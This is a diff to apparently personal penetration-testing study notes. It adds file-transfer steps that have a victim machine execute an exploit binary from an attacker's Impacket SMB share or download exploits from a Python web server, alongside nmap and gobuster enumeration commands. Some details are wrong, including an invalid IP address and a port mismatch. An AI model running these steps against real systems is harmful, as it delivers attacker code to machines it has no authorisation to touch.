@@ -16,22 +16,55 @@ hostname && whoami && type C:\Documents and Settings\Administrator\Desktop\proof
 hostname && whoami && cat /root/proof.txt && /sbin/ifconfig
 ```
 
+## Transferring files
+
+### Rdesktop
+
+If if had a remote dektop machine I used the following command to mount share folder:
+
+```
+root@kali:~/#: rdesktop 192.268.11.10 -r disk:share=/home/bayo/store
+```
+
+### SMB Share
+
+In kali use Impacket to create local SMB Share:
+
+```
+root@kali:~/#: python /usr/share/impacket/examples/smbserver.py MyShare /
+```
+
+On victim machine execute my payload via SMB:
+
+```
+C:\> \\192.168.11.10\MyShare\exploit_kernerl.exe
+```
+### Python Server
+
+On my kali machine, start the Python SimpleHTTPServer on port 80:
+
+```
+root@kali:~/#: python -m SimpleHTTPServer 8080
+```
+
+Then use powershell on victim machine / wget in linux to download my exploit.
+
 ## Methodology
 
 1) Ports & Services Enumeration using NMAP
 
 ```
-nmap -sV -sC -p- <IP>
-nmap -sU --top-ports=50 <IP>
-nmap --script smb-vuln-* <IP>
-nmap -sV -T4 -p- <IP> (Quick method)
+root@kali:~/#: nmap -sV -sC -p- <IP>
+root@kali:~/#: nmap -sU --top-ports=50 <IP>
+root@kali:~/#: nmap --script smb-vuln-* <IP>
+root@kali:~/#: nmap -sV -T4 -p- <IP> (Quick method)
 ```
 
 2) Enumerate web application
 
 ```
-gobuster dir -u <url> -w /usr/share/wordlist/directory-2.3-meduim.txt
-nikito -u <url>
+root@kali:~/#: gobuster dir -u <url> -w /usr/share/wordlist/directory-2.3-meduim.txt
+root@kali:~/#: nikito -u <url>
 ```
 
 3) Post Exploition
